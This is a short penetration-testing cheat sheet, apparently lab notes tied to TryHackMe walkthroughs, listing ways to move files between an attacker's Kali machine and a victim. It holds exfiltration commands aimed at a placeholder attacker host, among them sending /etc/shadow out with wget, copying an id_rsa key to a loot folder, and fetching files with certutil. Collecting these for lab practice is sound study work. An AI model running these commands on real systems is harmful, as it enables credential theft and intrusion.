# Transferring Files

## **SMB**

**Examples**

[#registry-hives](../walkthroughs/tryhackme/credentials-harvesting.md#registry-hives "mention")

**Kali**

```
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

**Victim**

```
copy C:\File\to\tranfer.exe \\$KALI\public\
```

## Netcat

### Send File

**Kali(receiving)**

```
nc -l -p 1234 > user.jpg
```

**Victim(sending)**

```
nc -w 3 $KALI 1234 < user.jpg
```

## wget

### Download File

**Victim (receiving)**

```
wget http://$VICTIM/$FILE

#From non-strandard port
wget http://$VICTIM:81/$FILE
```

### Send File

**Examples**

[wgel-ctf.md](../walkthroughs/tryhackme/wgel-ctf.md "mention")

**Kali(receiving)**

```
nc -lvnp 4444
```

**Victim(sending)**

```
sudo -u root /usr/bin/wget --post-file=/etc/shadow $KALI:4444
```



## **certutil**

**Example**

[retro.md](../walkthroughs/tryhackme/retro.md "mention")[relevant.md](../walkthroughs/tryhackme/relevant.md "mention")

**Kali**

```
python2 -m SimpleHTTPServer 82
```

**Victim**&#x20;

```
certutil -urlcache -f http://$KALI:82/$FILE $FILE
```



## SCP

### Download File

**Victim**

```
scp id_rsa root@$KALI:/root/loot
```

## xfreerdp

**Example**

[windows-privesc-arena.md](../walkthroughs/tryhackme/windows-privesc-arena.md "mention")

Login via RDP and setup shared drive

**Kali**

```
xfreerdp +clipboard /u:user /p:password321 /cert:ignore /v:$VICTIM /size:1024x568  /drive:kali,/root/
```

**Victim**

```
copy "C:\Users\User\Desktop\Tools\Source\windows_service.c" \\tsclient\kali\windows_service.c
```



## Share Files

### PHP

**Kali**

```
php -S 0.0.0.0:82
```

### **Python2**

**Kali**

```
python2 -m SimpleHTTPServer 82
```

### **Python3**

**Kali**

```
python3 -m http.server 82
```





